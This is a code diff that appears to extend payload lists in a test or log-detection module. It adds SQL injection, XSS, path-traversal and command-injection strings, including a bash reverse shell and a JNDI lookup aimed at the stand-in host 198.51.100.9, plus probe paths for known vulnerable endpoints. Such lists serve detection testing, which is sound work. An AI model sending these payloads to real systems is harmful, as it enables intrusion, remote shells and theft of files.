@@ -124,6 +124,7 @@ _SQL_PAYLOADS = [
     "/login?user=admin'--",
     "/products?id=1%27+OR+1%3D1--",
     "/items?id=10+AND+SLEEP(5)",
+    "/items?id=1+AND+(SELECT+COUNT(*)+FROM+information_schema.tables)>0",
 ]
 _XSS_PAYLOADS = [
     "/search?q=<script>alert(1)</script>",
@@ -131,6 +132,8 @@ _XSS_PAYLOADS = [
     "/comment?text=<img+src=x+onerror=alert(1)>",
     "/redirect?url=javascript:alert(1)",
     r"/profile?name=\"><svg/onload=alert(1)>",  # servers log a quote as \"
+    r"/search?q=x\"+onmouseover=\"alert(1)",
+    "/page?frame=<iframe+src=//198.51.100.9/x>",
 ]
 _TRAVERSAL_PAYLOADS = [
     "/download?file=../../../../etc/passwd",
@@ -138,6 +141,10 @@ _TRAVERSAL_PAYLOADS = [
     "/files?name=..%5c..%5cwindows%5cwin.ini",
     "/view?page=....//....//....//etc/passwd",
     "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "/view?page=../../../../var/www/html/index",
+    "/download?file=/etc/passwd",
+    "/index.php?page=php://filter/convert.base64-encode/resource=index",
+    "/static/..%c0%af..%c0%afhome/app/main",
 ]
 _COMMAND_PAYLOADS = [
     "/ping?host=127.0.0.1;cat+/etc/passwd",
@@ -145,6 +152,9 @@ _COMMAND_PAYLOADS = [
     "/api/exec?c=$(whoami)",
     "/tools?q=a&&wget+http://198.51.100.9/x.sh",
     "/ping?host=%60id%60",
+    "/cgi-bin/run?c=/bin/sh+-c+id",
+    "/api/run?c=bash+-i+>%26+/dev/tcp/198.51.100.9/4444+0>%261",
+    "/search?q=${jndi:ldap://198.51.100.9:1389/a}",
 ]
 _SENSITIVE_PAYLOADS = [
     "/.env",
@@ -155,6 +165,12 @@ _SENSITIVE_PAYLOADS = [
     "/phpinfo.php",
     "/id_rsa",
     "/config/database.yml",
+    "/phpmyadmin/",
+    "/wp-login.php?action=register",
+    "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "/boaform/admin/formLogin?username=admin",
+    "/GponForm/diag_Form?go=1",
+    "/HNAP1/GetDeviceSettings",
 ]
 _SSRF_PAYLOADS = [
     "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
